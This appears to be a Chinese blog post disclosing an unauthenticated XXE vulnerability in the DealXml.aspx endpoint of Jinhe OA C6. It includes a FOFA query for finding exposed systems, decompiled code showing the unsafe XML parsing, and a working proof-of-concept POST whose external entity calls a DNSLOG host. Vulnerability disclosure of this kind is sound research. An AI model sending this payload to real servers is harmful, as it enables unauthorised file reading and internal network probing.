---
title: "金和OA DealXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-DealXml-xxe.html
asset_dir: assets/金和oa-dealxml.aspx-xxe漏洞
---

# 金和OA DealXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/29 12:51
- 603浏览
- [0评论](#comment)
- 7分钟阅读

深入探索

代码安全审计

防火墙软件

Windows安全工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `DealXml.aspx` 接口处存在[XXE漏洞](https://mrxn.net/tag/XXE)，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 DealXml.aspx 在 bin 目录下查找 JHSoft.Web.Appraise.dll 将其进行反编译后找到 `DealXml` 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.appraise/DealXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

安全研究工具

软件

文本剥离工具

在DNSLOG平台成功收到请求

网络安全

[![金和OA DealXml.aspx XXE漏洞](images/img-001-a17b8968ebbd.webp)](https://image.mrxn.net/3c4e418dd4c74201b148398cef7e9368.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
